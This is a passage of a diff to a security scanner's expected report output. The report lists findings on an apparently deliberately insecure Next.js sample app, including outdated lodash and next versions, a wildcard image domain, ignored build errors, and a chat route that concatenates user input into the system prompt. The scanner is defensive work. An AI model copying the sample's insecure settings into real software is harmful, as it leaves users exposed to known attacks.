-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2020-28500                                                      │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  16. 🟡 [MEDIUM] Insecure Next.js configuration ────────────────────────────────────────────────╮
+│                                                                                                  │
+│  next.config.js:4                                                                                │
+│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high             │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  `images.domains` contains a wildcard '*' — any host can be proxied through your Next.js image   │
+│  optimizer.                                                                                      │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    images: { domains: ['*'] },                 // any host can be proxied                        │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.         │
+│  ignoring build/type errors hides real bugs, and overly broad image `domains`/`remotePatterns`   │
+│  let attackers proxy arbitrary content through your domain.                                      │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to     │
+│  hosts you control.                                                                              │
+│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }           │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://nextjs.org/docs/app/api-reference/next-config-js                                   │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  22. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2026-2950 (vulnerable <4.18.0). Upgrade to 4.18.0 or        │
-│  later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in your code.    │
-│  lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`      │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2026-2950                                                       │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  17. 🔵 [LOW] Model call sets no max output token limit ────────────────────────────────────────╮
+│                                                                                                  │
+│  app/api/chat/route.ts:7                                                                         │
+│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1496  ·  confidence: medium                    │
+│                                                                                                  │
+│  🎯 Reachable (server-side) from app/api/chat/route.ts                                           │
+│                                                                                                  │
+│  This model call sets no max output-token limit — output tokens are the costliest part of an AI  │
+│  call, so a crafted prompt can balloon your bill. Set max_tokens / max_output_tokens.            │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    chat.completions.create({                                                                     │
+│        messages: [                                                                               │
+│          { role: 'system', content: 'You are a shop assistant. ' + body.persona }, // prompt     │
+│    injection                                                                                     │
+│          { role: 'user', content: body.message },                                                │
+│        ],                                                                                        │
+│      })                                                                                          │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  This model call doesn't set a maximum on how much text the model can                            │
+│  generate (no `max_tokens` / `max_output_tokens` / `maxOutputTokens`). Output                    │
+│  tokens are usually the most expensive part of an AI call, so an unbounded                       │
+│  response can cost far more than you expect — and an attacker can deliberately                   │
+│  craft a prompt that makes the model ramble to the limit, multiplying your                       │
+│  bill across many requests. It can also make responses slow and unpredictable.                   │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Set an explicit cap on output length on every model call. Pick the smallest                     │
+│  number that still fits your feature (e.g. a chat reply rarely needs more than                   │
+│  a few hundred tokens). The exact field name depends on the SDK: `max_tokens`                    │
+│  (OpenAI chat / Anthropic), `max_output_tokens` (OpenAI Responses), or                           │
+│  `maxOutputTokens` (Vercel AI SDK).                                                              │
+│    const completion = await openai.chat.completions.create({                                     │
+│      model: 'gpt-4o-mini',                                                                       │
+│      max_tokens: 500,        // cap the response                                                 │
+│      messages,                                                                                   │
+│    });                                                                                           │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://platform.openai.com/docs/api-reference/chat/create#chat-create-max_tokens          │
+│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/                │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  23. 🟡 [MEDIUM] Dependency with a known security vulnerability ──────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2025-13465 (vulnerable >=4.0.0,<4.17.23). Upgrade to        │
-│  4.17.23 or later. (EPSS 0% 30-day exploit probability) 🎯 `lodash` is imported and used in    │
-│  your code. Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions   │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2025-13465                                                      │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
+╭─  18. 🔵 [LOW] Dependency with a known security vulnerability ───────────────────────────────────╮
+│                                                                                                  │
+│  package.json:14                                                                                 │
+│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·  confidence:   │
+│  high                                                                                            │
+│                                                                                                  │
+│  ○ Not reachable from a known entrypoint (lower priority)                                        │
+│                                                                                                  │
+│  lodash@4.17.15 is affected by CVE-2020-8203 (vulnerable <4.17.20). Upgrade to 4.17.20 or        │
+│  later. ✅ Lower priority: you import `lodash` but never call the vulnerable `set, setWith,      │
+│  zipObjectDeep`. Prototype pollution in lodash via zipObjectDeep / set-like paths allowing       │
+│  modification of Object.prototype.                                                               │
+│                                                                                                  │
+│  Found here:                                                                                     │
+│    "lodash": "4.17.15"  // CVE-2020-8203                                                         │
+│                                                                                                  │
+│  💡 Why this matters                                                                             │
+│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers        │
+│  actively scan for apps using vulnerable versions because a working exploit is already           │
+│  published.                                                                                      │
+│                                                                                                  │
+│  🛠  How to fix it                                                                                │
+│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in         │
+│  package.json).                                                                                  │
+│    npm install <package>@<patched-version>                                                       │
+│                                                                                                  │
+│  📚 Learn more                                                                                   │
+│     • https://github.com/advisories                                                              │
+│                                                                                                  │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
 
-╭─  24. 🟡 [MEDIUM] Missing security response headers ───────────────────────────────────────────╮
-│                                                                                                │
-│  next.config.js:1                                                                              │
-│  CWE-693  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190, T1185  ·  confidence: low    │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  next.config defines no security headers (no `headers()` setting X-Frame-Options /             │
-│  Content-Security-Policy / Strict-Transport-Security). Add them for defense in depth, unless   │
-│  you set them in middleware.                                                                   │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Security headers (Content-Security-Policy, X-Frame-Options, Strict-Transport-Security,        │
-│  X-Content-Type-Options) are extra guardrails the browser enforces for you — blocking          │
-│  clickjacking, forcing HTTPS, and limiting the damage of an XSS bug. Without them you lose     │
-│  defense in depth.                                                                             │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Set security headers in next.config.js `headers()` (or your server/middleware).               │
-│    // next.config.js                                                                           │
-│    async headers() {                                                                           │
-│      return [{ source: '/(.*)', headers: [                                                     │
-│        { key: 'X-Frame-Options', value: 'DENY' },                                              │
-│        { key: 'X-Content-Type-Options', value: 'nosniff' },                                    │
-│        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains;        │
-│    preload' },                                                                                 │
-│      ]}];                                                                                      │
-│    }                                                                                           │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://nextjs.org/docs/app/api-reference/next-config-js/headers                         │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  25. 🟡 [MEDIUM] Insecure Next.js configuration ──────────────────────────────────────────────╮
-│                                                                                                │
-│  next.config.js:2                                                                              │
-│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high           │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  `typescript.ignoreBuildErrors: true` disables a safety check, letting type/lint errors ship   │
-│  to production.                                                                                │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    typescript: { ignoreBuildErrors: true },   // ships type errors to prod                     │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.       │
-│  ignoring build/type errors hides real bugs, and overly broad image                            │
-│  `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.         │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to   │
-│  hosts you control.                                                                            │
-│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }         │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://nextjs.org/docs/app/api-reference/next-config-js                                 │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  26. 🟡 [MEDIUM] Insecure Next.js configuration ──────────────────────────────────────────────╮
-│                                                                                                │
-│  next.config.js:3                                                                              │
-│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high           │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  `eslint.ignoreDuringBuilds: true` disables a safety check, letting type/lint errors ship to   │
-│  production.                                                                                   │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    eslint: { ignoreDuringBuilds: true },                                                       │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.       │
-│  ignoring build/type errors hides real bugs, and overly broad image                            │
-│  `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.         │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to   │
-│  hosts you control.                                                                            │
-│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }         │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://nextjs.org/docs/app/api-reference/next-config-js                                 │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  27. 🟡 [MEDIUM] Insecure Next.js configuration ──────────────────────────────────────────────╮
-│                                                                                                │
-│  next.config.js:4                                                                              │
-│  CWE-16  ·  A05:2021-Security Misconfiguration  ·  ATT&CK T1190  ·  confidence: high           │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  `images.domains` contains a wildcard '*' — any host can be proxied through your Next.js       │
-│  image optimizer.                                                                              │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    images: { domains: ['*'] },                 // any host can be proxied                      │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  Some next.config options loosen safety in ways that are easy to ship by accident — e.g.       │
-│  ignoring build/type errors hides real bugs, and overly broad image                            │
-│  `domains`/`remotePatterns` let attackers proxy arbitrary content through your domain.         │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Don't ignore type/lint errors in production builds, and scope image and rewrite patterns to   │
-│  hosts you control.                                                                            │
-│    images: { remotePatterns: [{ protocol: 'https', hostname: 'assets.example.com' }] }         │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://nextjs.org/docs/app/api-reference/next-config-js                                 │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  28. 🔵 [LOW] Model call sets no max output token limit ──────────────────────────────────────╮
-│                                                                                                │
-│  app/api/chat/route.ts:7                                                                       │
-│  CWE-770  ·  A04:2021-Insecure Design  ·  ATT&CK T1496  ·  confidence: medium                  │
-│                                                                                                │
-│  🎯 Reachable (server-side) from app/api/chat/route.ts                                         │
-│                                                                                                │
-│  This model call sets no max output-token limit — output tokens are the costliest part of an   │
-│  AI call, so a crafted prompt can balloon your bill. Set max_tokens / max_output_tokens.       │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    chat.completions.create({                                                                   │
-│        messages: [                                                                             │
-│          { role: 'system', content: 'You are a shop assistant. ' + body.persona }, //          │
-│    prompt injection                                                                            │
-│          { role: 'user', content: body.message },                                              │
-│        ],                                                                                      │
-│      })                                                                                        │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This model call doesn't set a maximum on how much text the model can                          │
-│  generate (no `max_tokens` / `max_output_tokens` / `maxOutputTokens`). Output                  │
-│  tokens are usually the most expensive part of an AI call, so an unbounded                     │
-│  response can cost far more than you expect — and an attacker can deliberately                 │
-│  craft a prompt that makes the model ramble to the limit, multiplying your                     │
-│  bill across many requests. It can also make responses slow and unpredictable.                 │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Set an explicit cap on output length on every model call. Pick the smallest                   │
-│  number that still fits your feature (e.g. a chat reply rarely needs more than                 │
-│  a few hundred tokens). The exact field name depends on the SDK: `max_tokens`                  │
-│  (OpenAI chat / Anthropic), `max_output_tokens` (OpenAI Responses), or                         │
-│  `maxOutputTokens` (Vercel AI SDK).                                                            │
-│    const completion = await openai.chat.completions.create({                                   │
-│      model: 'gpt-4o-mini',                                                                     │
-│      max_tokens: 500,        // cap the response                                               │
-│      messages,                                                                                 │
-│    });                                                                                         │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://platform.openai.com/docs/api-reference/chat/create#chat-create-max_tokens        │
-│     • https://owasp.org/www-project-top-10-for-large-language-model-applications/              │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  29. 🔵 [LOW] Dependency with a known security vulnerability ─────────────────────────────────╮
-│                                                                                                │
-│  package.json:11                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  🎯 Reachable                                                                                  │
-│                                                                                                │
-│  next@12.1.0 is affected by CVE-2025-32421 (vulnerable >=0.9.9,<14.2.24). Upgrade to 14.2.24   │
-│  or later. (EPSS 1% 30-day exploit probability) 🎯 `next` is imported and used in your code.   │
-│  Next.js Race Condition to Cache Poisoning                                                     │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "next": "12.1.0"  // CVE-2025-32421                                                         │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-╭─  30. 🔵 [LOW] Dependency with a known security vulnerability ─────────────────────────────────╮
-│                                                                                                │
-│  package.json:14                                                                               │
-│  CWE-1395  ·  A06:2021-Vulnerable and Outdated Components  ·  ATT&CK T1195.001  ·              │
-│  confidence: high                                                                              │
-│                                                                                                │
-│  ○ Not reachable from a known entrypoint (lower priority)                                      │
-│                                                                                                │
-│  lodash@4.17.15 is affected by CVE-2020-8203 (vulnerable <4.17.20). Upgrade to 4.17.20 or      │
-│  later. (EPSS 3% 30-day exploit probability) ✅ Lower priority: you import `lodash` but never  │
-│  call the vulnerable `set, setWith, zipObjectDeep`. Prototype pollution in lodash via          │
-│  zipObjectDeep / set-like paths allowing modification of Object.prototype.                     │
-│                                                                                                │
-│  Found here:                                                                                   │
-│    "lodash": "4.17.15"  // CVE-2020-8203                                                       │
-│                                                                                                │
-│  💡 Why this matters                                                                           │
-│  This package version has a publicly documented security flaw (a CVE/advisory). Attackers      │
-│  actively scan for apps using vulnerable versions because a working exploit is already         │
-│  published.                                                                                    │
-│                                                                                                │
-│  🛠  How to fix it                                                                              │
-│  Upgrade to the patched version listed in the advisory (`npm update <pkg>` or bump it in       │
-│  package.json).                                                                                │
-│    npm install <package>@<patched-version>                                                     │
-│                                                                                                │
-│  📚 Learn more                                                                                 │
-│     • https://github.com/advisories                                                            │
-│                                                                                                │
-│                                                                                                │
-╰────────────────────────────────────────────────────────────────────────────────────────────────╯
-
-──────────────────────────────────────────────────────────────────────────────────────────────────
+────────────────────────────────────────────────────────────────────────────────────────────────────
 Tip: run njordscan explain <rule-id> for a deeper walk-through, or --explain-with-ai for an 
 AI-assisted review.
